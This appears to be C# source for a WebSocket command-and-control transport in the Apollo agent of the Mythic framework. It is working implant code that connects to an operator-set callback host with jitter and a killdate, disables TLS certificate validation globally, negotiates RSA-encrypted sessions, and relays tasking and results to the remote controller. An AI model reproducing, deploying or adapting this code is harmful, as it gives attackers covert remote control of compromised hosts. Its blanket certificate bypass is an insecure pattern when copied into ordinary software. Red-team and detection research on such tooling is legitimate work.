using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using WebSocketSharp;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Constants;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using ST = System.Threading.Tasks;
using System.Threading;
using ApolloInterop.Serializers;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;

namespace WebsocketTransport
{
    public class WebsocketProfile : C2Profile, IC2Profile
    {
        internal WebSocket Client;

        internal CancellationTokenSource Cancellation;
        internal ST.Task Task;

        private int CallbackInterval;
        private double CallbackJitter;
        private int CallbackPort;
        private string CallbackHost;
        private string PostUri;
        // synthesis of CallbackHost, CallbackPort, PostUri
        private string Endpoint;
        private bool EncryptedExchangeCheck;
        private string ProxyHost;
        private string ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string KillDate;
        // synthesis of ProxyHost and ProxyPort
        private string ProxyAddress;
        private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
        private bool _uuidNegotiated = false;
        private RSAKeyGenerator rsa = null;
        private static ConcurrentQueue<byte[]> senderQueue = new ConcurrentQueue<byte[]>();
        private ST.Task agentConsumerTask = null;
        private ST.Task agentProcessorTask = null;
        private static JsonSerializer jsonSerializer = new JsonSerializer();
        private static AutoResetEvent senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AutoResetEvent receiverEvent = new AutoResetEvent(false);
        private Action sendAction;
        private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
        private string partialData = "";

        public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            CallbackPort = int.Parse(data["callback_port"]);
            CallbackHost = data["callback_host"];
            PostUri = data["post_uri"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            ProxyHost = data["proxy_host"];
            ProxyPort = data["proxy_port"];
            rsa = agent.GetApi().NewRSAKeyPair(4096);
            if (!string.IsNullOrEmpty(ProxyPort))
            {
                ProxyAddress = string.Format("{0}:{1}", ProxyHost, ProxyPort);
            }
            else
            {
                ProxyAddress = ProxyHost;
            }

            if (PostUri[0] != '/')
            {
                PostUri = $"/{PostUri}";
            }
            Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
            ProxyUser = data["proxy_user"];
            ProxyPass = data["proxy_pass"];
            KillDate = data["killdate"];

            string[] reservedStrings = new[]
            {
                "callback_interval",
                "callback_jitter",
                "callback_port",
                "callback_host",
                "post_uri",
                "encrypted_exchange_check",
                "proxy_host",
                "proxy_port",
                "proxy_user",
                "proxy_pass",
                "killdate",
            };

            foreach (string k in data.Keys)
            {
                if (!reservedStrings.Contains(k))
                {
                    _additionalHeaders.Add(k, data[k]);
                }
            }

            // Disable certificate validation on web requests
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;


            //Agent.SetSleep(CallbackInterval, CallbackJitter);
            sendAction = () =>
            {
                while (Client.IsAlive)
                {
                    senderEvent.WaitOne();
                    if (senderQueue.TryDequeue(out byte[] result))
                    {
                        Client.Send(result);
                    }
                }
            };
        }

        public void Start()
        {
            agentConsumerTask = new ST.Task(() =>
            {
                while (Agent.IsAlive())
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        }
                        return false;
                    }))
                    {
                        Thread.Sleep(100);
                    }
                }
            });
            agentProcessorTask = new ST.Task(() =>
            {
                while (Agent.IsAlive())
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });
            agentConsumerTask.Start();
            agentProcessorTask.Start();
            agentProcessorTask.Wait();
            agentConsumerTask.Wait();
        }

        private bool GetTask(OnResponse<MessageResponse> onResp, string data)
        {
            return Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage msg)
            {
                return Recv<MessageResponse>(onResp, data);
            });
        }

        public bool IsOneWay()
        {
            return false;
        }

        public bool Send<T>(T message)
        {
            throw new Exception("HttpProfile does not support Send only.");
        }

        public bool Recv<TResult>(OnResponse<TResult> onResponse, string data)
        {
            try
            {
                onResponse(Serializer.Deserialize<TResult>(data));
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                receiverEvent.WaitOne();
                IMythicMessage msg = recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    recieverQueue = new ConcurrentQueue<IMythicMessage>(recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
                if (!Connected)
                    break;
            }
            return true;
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (Client == null)
            {
                Client = new WebSocket(Endpoint+PostUri);
                Client.ConnectAsync();
                Client.OnOpen += OnAsyncConnect;
                Client.OnMessage += OnAsyncMessageReceived;
                Client.OnClose += OnAsyncDisconnect;
            }

            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };
                AddToSenderQueue(handshake1);
                if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
                {
                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            AddToSenderQueue(checkinMsg);
            if (agentProcessorTask == null || agentProcessorTask.IsCompleted)
            {
                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse mResp = (MessageResponse)resp;
                    if (!_uuidNegotiated)
                    {
                        _uuidNegotiated = true;
                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                        checkinMsg.UUID = mResp.ID;
                    }
                    Connected = true;
                    return onResp(mResp);
                });
            }
            else
            {
                return true;
            }
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCChunkedData[] parts = Serializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach (IPCChunkedData part in parts)
            {
                senderQueue.Enqueue(Encoding.UTF8.GetBytes(jsonSerializer.Serialize(part)));
            }
            senderEvent.Set();
            return true;
        }

        private void OnAsyncDisconnect(object sender, CloseEventArgs args)
        {
            Console.WriteLine("OnAsyncDisconnect");
        }

        private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
        {
            Console.WriteLine("OnAsyncMessageReceived");
            Console.WriteLine(args.Data);

            string sData = args.Data;

            int sDataLen = sData.Length;
            int bytesProcessed = 0;
            while (bytesProcessed < sDataLen)
            {
                int lBracket = sData.IndexOf('{');
                int rBracket = sData.IndexOf('}');
                // No left bracket
                if (lBracket == -1)
                {
                    // No left or right bracket
                    if (rBracket == -1)
                    {
                        // Middle of the packet, just append
                        partialData += sData;
                        bytesProcessed += sData.Length;
                    }
                    else
                    {
                        // This is an ending packet, so we need to process
                        // then shift to the next
                        string d = new string(sData.Take(rBracket + 1).ToArray());
                        partialData += d;
                        bytesProcessed += d.Length;
                        UnwrapMessage();
                        sData = new string(sData.Skip(rBracket).ToArray());
                    }
                }
                // left bracket exists, we're starting a packet
                else
                {
                    // left bracket is ahead of starting index
                    // Thus we're in the middle of a packet receipt
                    if (lBracket > 0)
                    {
                        string d = new string(sData.Take(lBracket).ToArray());
                        partialData += d;
                        UnwrapMessage();
                        bytesProcessed += d.Length;
                        sData = new string(sData.Skip(d.Length).ToArray());
                        // true start of a new packet
                    }
                    else
                    {
                        // No ending delimiter, will need to wait for more
                        if (rBracket == -1)
                        {
                            partialData += sData;
                            bytesProcessed += sData.Length;
                        }
                        // Ending delimiter - time to unwrap singleton
                        else
                        {
                            string d = new string(sData.Take(rBracket + 1).ToArray());
                            partialData += d;
                            bytesProcessed += d.Length;
                            if (d.Length < sData.Length)
                            {
                                sData = new string(sData.Skip(d.Length).ToArray());
                            }
                            UnwrapMessage();
                        }
                    }
                }
            }
        }

        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = Serializer.DeserializeIPCMessage(data.ToArray(), mt);
            // Console.WriteLine("We got a message: {0}", mt.ToString());
            recieverQueue.Enqueue(msg);
            receiverEvent.Set();
        }
        private void UnwrapMessage()
        {
            IPCChunkedData chunkedData = jsonSerializer.Deserialize<IPCChunkedData>(partialData);
            partialData = "";
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private void OnAsyncConnect(object sender, EventArgs args)
        {
            if (writerTasks.Count > 0)
            {
                Client.Close();
                return;
            }

            ST.Task tmp = new ST.Task(sendAction);
            writerTasks[Client] = tmp;
            writerTasks[Client].Start();
            Connected = true;
        }
    }
}
